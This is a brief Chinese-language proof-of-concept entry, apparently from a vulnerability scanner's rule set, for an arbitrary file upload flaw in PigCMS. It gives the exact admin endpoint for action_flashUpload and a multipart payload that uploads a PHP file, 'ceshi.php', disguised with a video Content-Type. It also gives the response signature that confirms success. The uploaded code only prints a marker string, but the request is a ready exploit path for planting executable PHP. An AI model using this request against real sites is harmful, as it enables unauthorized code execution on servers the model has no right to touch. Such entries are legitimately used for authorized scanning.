# PigCMSaction_flashUpload接口处任意文件上传漏洞

PigCMSaction ｜ 文件上传 ｜ —
- **请求**：`POST /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1`

**Payload**
```
------HUHhuIUHNiugiuIUgbvgfCJH
Content-Disposition: form-data; name="filePath"; filename="ceshi.php"
Content-Type: video/x-flv
<?php echo "dudesuite";?>
------HUHhuIUHNiugiuIUgbvgfCJH
```
- **响应特征**：200 .php